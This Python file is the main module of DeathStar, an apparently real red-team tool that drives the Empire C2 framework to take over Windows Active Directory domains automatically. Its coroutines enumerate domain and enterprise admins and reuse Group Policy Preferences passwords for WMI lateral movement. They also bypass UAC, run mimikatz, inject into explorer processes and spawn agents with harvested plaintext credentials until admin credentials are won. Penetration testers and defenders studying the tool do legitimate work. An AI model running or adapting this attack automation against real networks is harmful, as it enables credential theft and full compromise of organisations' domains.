#! /usr/bin/env python3

# Copyright (c) 2020 Marcello Salvati (byt3bl33d3r@pm.me)
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

__version__ = "0.2.0"

import logging
import argparse
import asyncio
import traceback
from rich.logging import RichHandler
from collections import Counter
from deathstar.kybercrystals import KyberCrystals
from deathstar.planetaryrecon import PlanetaryRecon
from deathstar.empire import EmpireApiClient, EmpireLoginError
from deathstar.utils import CustomArgFormatter, beautify_json, print_win_banner

logging.basicConfig(
    level=logging.INFO,
    format="[{name}] {message}",
    datefmt="[%X]",
    style="{",
    handlers=[RichHandler(rich_tracebacks=True, tracebacks_show_locals=True)]
)

logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)

log = logging.getLogger("deathstar")

class DeathStar:
    def __init__(self, empire):
        self.empire = empire
        self.priority_targets = []

        self.recon = PlanetaryRecon()
        self.kybers = KyberCrystals(self)
        self.won = asyncio.Event()

    async def host_pwned(self, host):
        for agent in await self.empire.agents.get():
            if agent.hostname.lower() == host.lower() or agent.internal_ip == host:
                return True
        return False

    async def planetary_recon(self):
        """
        Recon coroutine
        """

        log.debug("Recon task started")
        hunter_killer_missions = []

        try:
            while not self.won.is_set():
                for agent in await self.empire.agents.get():
                    if agent.domain and not self.recon.been_performed(agent.domain):
                        log.info(
                            f"{agent.name} => Starting recon on domain '{agent.domain}'"
                        )

                        domain = agent.domain
                        domain_sid = await self.kybers.get_domain_sid(agent)
                        domain_admins, enterprise_admins, domain_controllers = await asyncio.gather(
                            *[
                                self.kybers.get_group_member(agent, domain_sid + "-512"),  # DA's
                                self.kybers.get_group_member(agent, domain_sid + "-519"),  # EA's
                                self.kybers.get_domain_controller(agent),
                            ]
                        )

                        self.recon.set_domain_sid(domain, domain_sid)
                        self.recon.set_domain_admins(domain, domain_admins)
                        self.recon.set_enterprise_admins(domain, enterprise_admins)
                        self.recon.set_domain_controllers(domain, domain_controllers)

                        log.debug(f"DA group name: '{self.recon.get_da_group_name(agent.domain)}'")
                        log.debug(f"EA group name: '{self.recon.get_ea_group_name(agent.domain)}'")
                        log.info(f"{agent.name} => Recon complete for domain '{agent.domain}'")
                        # log.debug("Recon data:" + beautify_json(self.recon.data[agent.domain]))

                        self.recon.set_performed(agent.domain)

                        hunter_killer_missions.append(
                            asyncio.create_task(self.launch_hunter_killers(agent))
                        )

                await asyncio.sleep(3)
        except asyncio.CancelledError:
            log.debug("Cancelling planetary recon")
            [task.cancel() for task in hunter_killer_missions]
            await asyncio.gather(*hunter_killer_missions)
        except Exception:
            tb = traceback.format_exc()
            log.error(f"Planetary recon for agent {agent.name} errored out:\n {tb}")

    async def launch_hunter_killers(self, agent):
        """
        Domain Privesc coroutine
        """

        try:
            log.debug(f"{agent.name} - {agent.username} => Launching Hunter-Killers")

            gpos = await self.kybers.gpp(agent)
            for gpo in gpos:
                hosts = await self.kybers.get_gpo_computer(agent, gpo['guid'])
                for username, password in zip(gpo['usernames'], gpo['passwords']):
                    await asyncio.gather(*[
                        self.kybers.invoke_wmi(agent, host['name'], username=f".\\{username}", password=password)
                        for host in hosts
                        if not await self.host_pwned(host['name'])
                    ])

            log.debug("Hunter-Killers finished tasking")
        except asyncio.CancelledError:
            log.debug("Cancelling Hunter-Killer deployment")
        except Exception:
            tb = traceback.format_exc()
            log.error(f"Hunter-Killer targets for agent {agent.name} errored out:\n {tb}")

    async def galaxy_conquest(self, agent):
        """
        Lateral movement coroutine
        """

        try:
            log.debug(f"{agent.name} - {agent.username} => Starting galaxy conquest")

            conquest_tasks = [
                asyncio.create_task(self.kybers.find_localadmin_access(agent))
            ]

            await self.recon.event(agent.domain).wait()
            log.debug(f"{agent.name} => It's wabbit season, hunting for them admins")

            domain_admins_group = self.recon.get_da_group_name(agent.domain)
            enterprise_admins_group = self.recon.get_ea_group_name(agent.domain)

            conquest_tasks.extend(
                [
                    asyncio.create_task(self.kybers.user_hunter(agent, domain_admins_group)),
                    asyncio.create_task(self.kybers.user_hunter(agent, enterprise_admins_group)),
                ]
            )

            local_admin_hosts, da_sessions, ea_sessions = await asyncio.gather(*conquest_tasks)
            self.recon.set_priority_targets(agent.domain, da_sessions)
            self.recon.set_priority_targets(agent.domain, ea_sessions)

            # rdp_sessions = await asyncio.gather(*[self.kybers.get_rdp_session(agent, host) for host in local_admin_hosts])

            priority_targets = [
                host
                for host in local_admin_hosts
                if host in self.recon.get_priority_targets(agent.domain)
            ]

            log.debug(f"{agent.name} => Starting lateral movement")
            await asyncio.gather(*[self.kybers.invoke_wmi(agent, host) for host in priority_targets])
            await asyncio.gather(*[self.kybers.invoke_wmi(agent, host) for host in local_admin_hosts])

        except asyncio.CancelledError:
            log.debug(f"Cancelling galaxy conquest for agent {agent.name}")
        except Exception:
            tb = traceback.format_exc()
            log.error(f"Galaxy conquest for agent {agent.name} errored out:\n {tb}")

    async def fire_mission(self, agent):
        """
        Active monitoring coroutine
        """

        try:
            seen_usernames = []

            if agent.domain:
                await self.recon.event(agent.domain).wait()

            log.debug(f"{agent.name} => Starting fire mission")
            if not agent.high_integrity:
                await self.kybers.bypassuac_eventvwr(agent)

            if agent.high_integrity:
                await self.kybers.mimikatz(agent)

            while not self.won.is_set():
                if agent.high_integrity:
                    for process in await self.kybers.tasklist(agent):
                        if (
                            process["username"]
                            and not any(
                                map(
                                    lambda e: process["username"].startswith(e),
                                    ["NT", "Font", "Window"],
                                )
                            )
                            and process["username"] != agent.username
                            and process["username"] not in seen_usernames
                        ):
                            log.info(f"{agent.name} => Found process(s) running under '{process['username']}'")
                            if process["processname"] == "explorer":
                                log.debug(f"{agent.name} => Injecting into PID {process['pid']}")
                                await self.kybers.psinject(agent, process["pid"])
                                seen_usernames.append(process["username"])

                for entry in await self.kybers.get_loggedon(agent):
                    username = f"{entry['logondomain']}\\{entry['username']}"
                    if username in self.recon.all_admins and agent.hostname not in self.priority_targets:
                        log.info(f"{agent.name} => Admin {username} is logged into {agent.hostname}")
                        self.priority_targets.append(agent.hostname)

                await asyncio.sleep(60)

        except asyncio.CancelledError:
            log.debug(f"Cancelling fire mission for agent {agent.name}")
        except Exception:
            tb = traceback.format_exc()
            log.error(f"Fire mission for agent {agent.name} errored out:\n {tb}")

    async def agent_poller(self):
        """
        Launches fire missions and galaxy conquest missions on each agent
        """

        log.debug("Agent poller started")
        missions = []
        try:
            while not self.won.is_set():
                for agent in await self.empire.agents.get():
                    if not any(filter(lambda t: t.get_name() == agent.name, missions)):
                        log.info(f"{agent.name} => New agent connected!")
                        task = asyncio.create_task( self.fire_mission(agent), name=f"{agent.name}")
                        missions.append(task)

                        if agent.domain and not any(filter(lambda t: t.get_name() == agent.username, missions)):
                            task = asyncio.create_task(self.galaxy_conquest(agent), name=f"{agent.username}")
                            missions.append(task)

                await asyncio.sleep(3)
        except asyncio.CancelledError:
            [task.cancel() for task in missions]
            await asyncio.gather(*missions)
        except Exception:
            tb = traceback.format_exc()
            log.error(f"Agent poller errored out:\n {tb}")

    async def agent_spawner(self):
        """
        Spawns new agents on each new set of credentials
        """

        log.debug("Agent spawner started")

        while not self.won.is_set():
            plaintext_creds = filter(
                lambda c: c.credtype == "plaintext", await self.empire.credentials.get()
            )

            for cred in plaintext_creds:
                agents = await self.empire.agents.get()
                if agents:
                    if not any(
                        filter(
                            lambda a: a.domain == cred.domain
                            and a.username == cred.username,
                            agents,
                        )
                    ):
                        # Count hostnames for all agents
                        pwned_computers = Counter(map(lambda a: a.hostname, agents))

                        # Get the hostname with the least amount of occurances
                        least_pwned = list(
                            sorted(pwned_computers.items(), key=lambda h: h[1])
                        )[0]

                        # Get the agents on that machine
                        agent = list(
                            filter(lambda a: a.hostname == least_pwned, agents)
                        )[0]

                        log.info(f"Spawning agent on '{least_pwned}' with creds for {cred.pretty_username} as it has the least amount of agents")
                        await self.kybers.spawnas(agent, cred_id=cred.id)

            await asyncio.sleep(3)

    async def win_checker(self):
        """
        Checks for win conditions
        """

        log.debug("Win checker started")

        while not self.won.is_set():
            for agent in await self.empire.agents.get():
                if agent.username in self.recon.all_admins:
                    self.won.set()
                    log.info(f"Won by security context! Agent: {agent.name} Username: {agent.username}")
                    print_win_banner()

            for cred in await self.empire.credentials.get():
                if cred.credtype in ["plaintext", "hash"] and cred.pretty_username in self.recon.all_admins:
                    self.won.set()
                    log.info(f"Won by creds! '{cred.pretty_username} (from host {cred.host})")
                    print_win_banner()

            await asyncio.sleep(3)

    async def power_up(self):
        """
        Logs into Empire, creates starter listener and starts all coroutines
        """

        if "error" in await self.empire.listeners.get("DeathStar"):
            await self.empire.listeners.create(additional={"Port": 8443})

        await asyncio.gather(*[
            self.planetary_recon(),
            self.win_checker(),
            self.agent_spawner(),
            self.agent_poller(),
        ])


async def main(args):
    try:
        empire = EmpireApiClient(host=args.api_host, port=args.api_port)
        await empire.login(args.username, args.password)
        log.info("Empire login successful")
    except EmpireLoginError:
        log.error("Error logging into Empire, invalid credentials?")
    else:
        log.info("Powering up the DeathStar and waiting for agents")
        deathstar = DeathStar(empire)
        await deathstar.power_up()
    finally:
        await empire.close()


def run():
    args = argparse.ArgumentParser(
        description=f"""
        _______   _______     ___   .___________. __    __          _______.___________.    ___      .______      
        |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \     
        |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |    
        |  |  |  ||   __|   /  /_\  \    |  |     |   __   |        \   \       |  |      /  /_\  \   |      /     
        |  '--'  ||  |____ /  _____  \   |  |     |  |  |  |    .----)   |      |  |     /  _____  \  |  |\  \----.
        |_______/ |_______/__/     \__\  |__|     |__|  |__|    |_______/       |__|    /__/     \__\ | _| `._____|
                                                                                                           
                                                Version: {__version__}
    """,
        formatter_class=CustomArgFormatter,
    )
    args.add_argument("-u", "--username", type=str, required=True, help="Empire username")
    args.add_argument( "-p", "--password", type=str, required=True, help="Empire password")
    args.add_argument("--api-host", type=str, default="127.0.0.1", help="Empire API IP/Hostname")
    args.add_argument("--api-port", type=int, default=1337, help="Empire API port")
    args.add_argument("--debug", action="store_true", help="Enable debug output")

    args = args.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    log.debug("Passed arguments\n --> %r", vars(args))

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        log.info("Exiting...")

if __name__ == "__main__":
    run()
